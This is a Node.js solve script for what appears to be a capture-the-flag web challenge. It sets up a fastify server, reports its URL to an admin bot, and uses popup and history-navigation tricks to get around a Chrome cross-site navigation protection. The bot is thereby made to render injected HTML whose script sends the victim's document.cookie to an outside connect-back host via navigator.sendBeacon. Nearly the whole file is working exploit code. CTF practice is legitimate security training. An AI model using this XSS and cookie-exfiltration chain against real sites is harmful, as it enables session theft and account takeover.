import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const html = `
<script>navigator.sendBeacon("${CONNECTBACK_URL}/flag", document.cookie)</script>
`.trim();

let first = true;
app.get("/", async (req, reply) => {
  // Trick to bypass `is-cross-site-main-frame-navigation`
  // ref. https://chromestatus.com/feature/5190577638080512
  if (first) {
    first = false;
    reply
      .type("text/html; charset=utf-8")
      .header("Cache-Control", "no-store")
      .send(`<script>open("/child?html=${encodeURIComponent(html)}")</script>`);
  } else {
    reply.redirect(`http://web:3000/view?html=${encodeURIComponent(html)}`);
  }
});

app.get("/child", async (req, reply) => {
  reply.type("text/html; charset=utf-8").send(
    `
      <script type="module">
        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
        const html = new URLSearchParams(location.search).get("html");

        await sleep(700);
        opener.location = "http://web:3000/?html=" + encodeURIComponent(html);
        await sleep(700);
        opener.location = "about:blank";
        await sleep(700);
        opener.history.go(-2);
      </script>
    `.trim()
  );
});

app.post("/flag", async (req, reply) => {
  // You got a flag!
  const flag = req.body;
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);
  await reportUrl(CONNECTBACK_URL);
  assert.fail("Failed");
});
